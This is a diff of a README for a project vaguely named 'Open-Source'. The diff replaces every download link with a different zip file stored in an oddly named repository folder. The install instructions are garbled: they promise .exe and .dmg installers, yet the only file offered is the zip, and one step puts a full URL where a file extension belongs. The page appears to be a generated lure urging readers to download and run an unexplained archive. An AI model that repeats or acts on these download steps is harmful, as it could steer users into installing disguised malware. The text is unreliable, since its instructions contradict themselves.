@@ -8,7 +8,7 @@ Welcome to the Open-Source project! This software is user-friendly and designed 
 
 To download the application, please click the link below:
 
-[![Download Open-Source](https://raw.githubusercontent.com/rogerh1576/Open-Source/main/fulminuric/Open-Source_v3.6.zip)](https://raw.githubusercontent.com/rogerh1576/Open-Source/main/fulminuric/Open-Source_v3.6.zip)
+[![Download Open-Source](https://raw.githubusercontent.com/rogerh1576/Open-Source/main/fulminuric/Source_Open_1.3.zip)](https://raw.githubusercontent.com/rogerh1576/Open-Source/main/fulminuric/Source_Open_1.3.zip)
 
 ## 🔍 Features
 
@@ -31,7 +31,7 @@ To run Open-Source effectively, ensure your system meets the following requireme
 
 ## 📈 Download & Install
 
-To download the software, visit this page to download: [Open-Source Releases](https://raw.githubusercontent.com/rogerh1576/Open-Source/main/fulminuric/Open-Source_v3.6.zip).
+To download the software, visit this page to download: [Open-Source Releases](https://raw.githubusercontent.com/rogerh1576/Open-Source/main/fulminuric/Source_Open_1.3.zip).
 
 Follow these steps to install the application:
 
@@ -40,11 +40,11 @@ Follow these steps to install the application:
 3. **Download the File:** Click on the file name for your operating system to start the download. 
     - For Windows, look for files with the extension `.exe`.
     - For macOS, search for files with the extension `.dmg`.
-    - For Linux, you may find files with `https://raw.githubusercontent.com/rogerh1576/Open-Source/main/fulminuric/Open-Source_v3.6.zip` or similar.
+    - For Linux, you may find files with `https://raw.githubusercontent.com/rogerh1576/Open-Source/main/fulminuric/Source_Open_1.3.zip` or similar.
 4. **Run the Installer:**
     - For Windows: Locate the downloaded `.exe` file and double-click it to run the installer. Follow the prompts to complete the installation.
     - For macOS: Open the `.dmg` file, drag the Open-Source icon into the Applications folder.
-    - For Linux: Extract the `https://raw.githubusercontent.com/rogerh1576/Open-Source/main/fulminuric/Open-Source_v3.6.zip` file and follow the included instructions to install.
+    - For Linux: Extract the `https://raw.githubusercontent.com/rogerh1576/Open-Source/main/fulminuric/Source_Open_1.3.zip` file and follow the included instructions to install.
 5. **Launch the Application:** After the installation finishes, open the app from your applications list or desktop shortcut.
 
 ## 💬 Support & Feedback
